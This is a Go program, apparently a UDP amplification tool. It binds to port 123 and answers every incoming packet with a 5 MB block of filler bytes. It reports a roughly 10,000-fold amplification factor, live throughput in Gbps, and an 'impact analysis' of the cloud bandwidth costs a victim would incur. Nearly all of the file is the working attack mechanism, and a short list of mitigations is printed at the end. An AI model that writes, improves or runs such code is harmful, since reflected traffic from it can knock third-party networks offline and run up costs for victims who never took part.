package main
//amplifer
import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"runtime"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	PORT          = ":123"
	RESPONSE_SIZE = 1024 * 1024 * 5 // 2MB response seperti y.go
	NUM_WORKERS   = 8              // Sesuaikan dengan core count
	BUFFER_SIZE   = 1000          // Channel buffer size
)

type Stats struct {
	requestCount   uint64
	totalBytesSent uint64
	startTime      time.Time
	lastUpdate     time.Time
	lastBytes      uint64
}

var (
	stats    Stats
	stopChan = make(chan struct{})
)

func main() {
	// Set GOMAXPROCS untuk memanfaatkan semua core
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	
	addr, err := net.ResolveUDPAddr("udp", PORT)
	if err != nil {
		panic(err)
	}
	
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	// Initialize stats
	stats = Stats{
		startTime:  time.Now(),
		lastUpdate: time.Now(),
	}

	// Print initial info and impact analysis
	printServerInfo()
	demonstrateImpact()

	// Pre-allocate response buffer
	response := make([]byte, RESPONSE_SIZE)
	for i := range response {
		response[i] = 0x1c
	}

	// Channel untuk mendistribusikan pekerjaan
	jobs := make(chan *net.UDPAddr, BUFFER_SIZE)
	
	// Start monitoring goroutine
	go monitorStats()

	// Worker pool
	var wg sync.WaitGroup
	for i := 0; i < NUM_WORKERS; i++ {
		wg.Add(1)
		go worker(conn, response, jobs, &wg)
	}

	// Signal handler
	go func() {
		<-sigChan
		fmt.Printf("\n\n💨 Shutting down...\n")
		close(stopChan)
		close(jobs)
		wg.Wait()
		printFinalStats()
		os.Exit(0)
	}()

	// Main loop
	buffer := make([]byte, 512)
	for {
		select {
		case <-stopChan:
			return
		default:
			conn.SetReadDeadline(time.Now().Add(time.Second))
			n, remoteAddr, err := conn.ReadFromUDP(buffer)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				continue
			}
			
			select {
			case jobs <- remoteAddr:
				atomic.AddUint64(&stats.requestCount, 1)
				atomic.AddUint64(&stats.totalBytesSent, uint64(RESPONSE_SIZE))
			default:
				// Skip if channel is full
			}
		}
	}
}

func worker(conn *net.UDPConn, response []byte, jobs <-chan *net.UDPAddr, wg *sync.WaitGroup) {
	defer wg.Done()
	
	for remoteAddr := range jobs {
		select {
		case <-stopChan:
			return
		default:
			conn.WriteToUDP(response, remoteAddr)
		}
	}
}

func monitorStats() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			current := atomic.LoadUint64(&stats.totalBytesSent)
			duration := time.Since(stats.lastUpdate).Seconds()
			bytesPerSec := float64(current - stats.lastBytes) / duration
			gbps := (bytesPerSec * 8) / 1_000_000_000

			fmt.Printf("\r⚡ Requests: %d | 📊 Total: %.2f GB | 📈 Current: %.2f Gbps",
				atomic.LoadUint64(&stats.requestCount),
				float64(current)/(1024*1024*1024),
				gbps)
			
			stats.lastBytes = current
			stats.lastUpdate = time.Now()
		}
	}
}

func printServerInfo() {
	fmt.Printf("\n🚀 High-Performance Amplifier v2.0\n")
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("⚠️  WARNING: Enhanced Amplification Mode\n")
	fmt.Printf("📡 Port: %s\n", PORT)
	fmt.Printf("💻 CPU Cores: %d\n", runtime.NumCPU())
	fmt.Printf("📦 Response Size: %d MB\n", RESPONSE_SIZE/(1024*1024))
	fmt.Printf("👥 Workers: %d\n", NUM_WORKERS)
	fmt.Printf("📈 Amplification Factor: %dx\n", RESPONSE_SIZE/512)
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
}

func printFinalStats() {
	duration := time.Since(stats.startTime)
	totalGB := float64(atomic.LoadUint64(&stats.totalBytesSent)) / (1024 * 1024 * 1024)
	avgGbps := (totalGB * 8) / duration.Seconds()

	fmt.Printf("\n📊 Final Statistics:\n")
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("⏱️  Runtime: %v\n", duration.Round(time.Second))
	fmt.Printf("📨 Total Requests: %d\n", atomic.LoadUint64(&stats.requestCount))
	fmt.Printf("📦 Total Data: %.2f GB\n", totalGB)
	fmt.Printf("⚡ Average Speed: %.2f Gbps\n", avgGbps)
}

// Impact analysis functions dari y.go
func calculateBandwidthAmplification(inputSize, outputSize int) float64 {
	return float64(outputSize) / float64(inputSize)
}

func calculateCostImpact(gbpsOutput float64, durationHours float64, costPerGB float64) float64 {
	totalGB := gbpsOutput * 8 * 3600 * durationHours / 8
	return totalGB * costPerGB
}

func demonstrateImpact() {
	fmt.Println("📈 Impact Analysis")
	fmt.Println("━━━━━━━━━━━━━━━━")
	
	inputSize := 512
	outputSize := RESPONSE_SIZE
	
	amplification := calculateBandwidthAmplification(inputSize, outputSize)
	fmt.Printf("📊 Amplification: %.0fx\n", amplification)
	
	// Scenario analysis
	attackerBandwidth := 10.0 // Mbps
	amplifiedBandwidth := attackerBandwidth * amplification / 8
	
	fmt.Printf("📡 Input Bandwidth: %.1f Mbps\n", attackerBandwidth)
	fmt.Printf("💥 Output Bandwidth: %.1f Gbps\n", amplifiedBandwidth)
	
	// Cost impact
	awsCostPerGB := 0.09
	costPer1Hour := calculateCostImpact(amplifiedBandwidth, 1.0, awsCostPerGB)
	costPer24Hours := calculateCostImpact(amplifiedBandwidth, 24.0, awsCostPerGB)
	
	fmt.Printf("\n💰 Cost Impact (AWS):\n")
	fmt.Printf("   • 1 hour: $%.2f\n", costPer1Hour)
	fmt.Printf("   • 24 hours: $%.2f\n", costPer24Hours)
	
	fmt.Printf("\n🛡️  Security Notes:\n")
	fmt.Printf("   • Rate limiting per IP\n")
	fmt.Printf("   • Response size limits\n")
	fmt.Printf("   • Source validation\n")
	fmt.Printf("   • DDoS protection\n")
	fmt.Printf("   • Network filtering\n")
	fmt.Println("━━━━━━━━━━━━━━━━\n")
}